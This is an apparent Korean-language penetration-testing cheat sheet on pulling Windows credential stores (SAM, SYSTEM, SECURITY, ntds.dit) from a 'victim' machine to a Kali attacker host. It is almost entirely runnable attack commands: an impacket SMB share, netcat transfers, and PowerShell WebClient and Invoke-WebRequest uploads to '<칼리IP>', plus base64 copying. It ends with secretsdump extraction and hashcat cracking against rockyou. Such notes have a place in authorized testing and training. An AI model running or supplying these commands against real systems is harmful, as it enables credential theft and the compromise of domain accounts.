# Windows_to_Linux

# 파일전송 — Windows → Linux (수집)

SAM, SYSTEM, ntds.dit, 크리덴셜 파일 등을 칼리로 가져오는 방법.

---

## SMB 공유로 업로드

```bash
# 칼리에서 공유 시작
impacket-smbserver share /tmp/loot -smb2support
```

```bash
:: 피해자에서 복사
copy C:\Windows\System32\config\SAM \\<칼리IP>\share\
copy C:\Windows\System32\config\SYSTEM \\<칼리IP>\share\
copy C:\Windows\System32\config\SECURITY \\<칼리IP>\share\
copy C:\Windows\NTDS\ntds.dit \\<칼리IP>\share\
```

---

## nc로 전송

```bash
# 칼리에서 수신 대기
nc -lvnp 4444 > sam.hive

# 피해자에서 전송
nc.exe <칼리IP> 4444 < C:\Windows\System32\config\SAM
```

---

## PowerShell WebClient UploadFile

```bash
# 칼리에서 업로드 수신 서버
# python3 upload_server.py (커스텀 필요)
```

```powershell
# 피해자에서
(New-Object Net.WebClient).UploadFile('http://<칼리IP>/upload', 'C:\loot\SAM')
Invoke-WebRequest -Method Post -Uri http://<칼리IP>/upload -InFile C:\loot\SAM
```

---

## base64로 터미널에서 직접 복사

```powershell
# 파일을 base64로 출력
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Windows\System32\config\SAM"))

# 칼리에서 디코딩
echo "BASE64STRING" | base64 -d > sam.hive
```

---

## 수집한 해시 크랙

```bash
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```